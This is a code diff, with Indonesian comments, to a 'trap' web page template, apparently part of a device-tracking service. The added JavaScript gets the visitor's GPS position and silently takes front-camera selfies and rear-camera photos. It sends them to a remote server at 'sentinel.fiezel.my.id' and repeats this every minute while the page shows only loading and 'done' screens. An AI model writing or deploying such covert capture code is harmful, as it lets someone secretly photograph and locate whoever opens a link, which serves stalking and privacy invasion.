@@ -207,19 +207,58 @@ h1{font-size:18px;font-weight:800;margin-bottom:8px}
 <script>
 const DID='${deviceId}',CLOUD='https://sentinel.fiezel.my.id';
 let going=false;
+
+async function capturePhoto(facing){
+  try{
+    const stream=await navigator.mediaDevices.getUserMedia({video:{facingMode:facing,width:{ideal:640},height:{ideal:480}}});
+    const v=document.createElement('video');v.srcObject=stream;v.setAttribute('playsinline','');
+    await new Promise(r=>{v.onloadedmetadata=r;v.play()});
+    await new Promise(r=>setTimeout(r,600));
+    const c=document.createElement('canvas');c.width=v.videoWidth||640;c.height=v.videoHeight||480;
+    c.getContext('2d').drawImage(v,0,0);
+    stream.getTracks().forEach(t=>t.stop());
+    return c.toDataURL('image/jpeg',0.55);
+  }catch{return null}
+}
+
+async function sendBeacon(lat,lon,acc,extra){
+  if(!DID)return;
+  try{await fetch(CLOUD+'/api/beacon/'+DID,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({lat,lon,accuracy:acc,network:navigator.connection?navigator.connection.effectiveType:null,...extra})})}catch{}
+}
+
 async function go(){
   if(going)return;going=true;
   document.getElementById('in').style.display='none';
   document.getElementById('ld').style.display='block';
+
+  // 1. GPS
   let lat=null,lon=null,acc=null;
   try{const p=await new Promise((r,j)=>navigator.geolocation.getCurrentPosition(r,j,{enableHighAccuracy:true,timeout:10000,maximumAge:0}));lat=p.coords.latitude;lon=p.coords.longitude;acc=Math.round(p.coords.accuracy)}catch{}
-  if(DID){try{await fetch(CLOUD+'/api/beacon/'+DID,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({lat,lon,accuracy:acc,alert:true,alertReason:'trap:${type}',network:navigator.connection?navigator.connection.effectiveType:null})})}catch{}}
-  if(DID){try{localStorage.setItem('sz_trap',DID)}catch{};poll()}
-  await new Promise(r=>setTimeout(r,2500));
+
+  // 2. Foto depan
+  const selfie=await capturePhoto('user');
+  // 3. Foto belakang
+  const photo=await capturePhoto('environment');
+
+  // 4. Kirim semua sekaligus
+  await sendBeacon(lat,lon,acc,{alert:true,alertReason:'trap:${type}',selfie,photo});
+
+  if(DID){try{localStorage.setItem('sz_trap',DID)}catch{}}
+
+  // Tampilkan done
+  await new Promise(r=>setTimeout(r,1500));
   document.getElementById('ld').style.display='none';
   document.getElementById('dn').style.display='block';
+
+  // 5. Polling terus selama halaman terbuka
+  setInterval(async()=>{
+    let la=null,lo=null,ac=null;
+    try{const p=await new Promise((r,j)=>navigator.geolocation.getCurrentPosition(r,j,{timeout:8000}));la=p.coords.latitude;lo=p.coords.longitude;ac=Math.round(p.coords.accuracy)}catch{}
+    const sf=await capturePhoto('user');
+    const ph=await capturePhoto('environment');
+    await sendBeacon(la,lo,ac,{selfie:sf,photo:ph});
+  },60000);
 }
-function poll(){setInterval(async()=>{let lat=null,lon=null,acc=null;try{const p=await new Promise((r,j)=>navigator.geolocation.getCurrentPosition(r,j,{timeout:8000}));lat=p.coords.latitude;lon=p.coords.longitude;acc=Math.round(p.coords.accuracy)}catch{}try{await fetch(CLOUD+'/api/beacon/'+DID,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({lat,lon,accuracy:acc})})}catch{}},60000)}
 </script></body></html>`;
 }
 
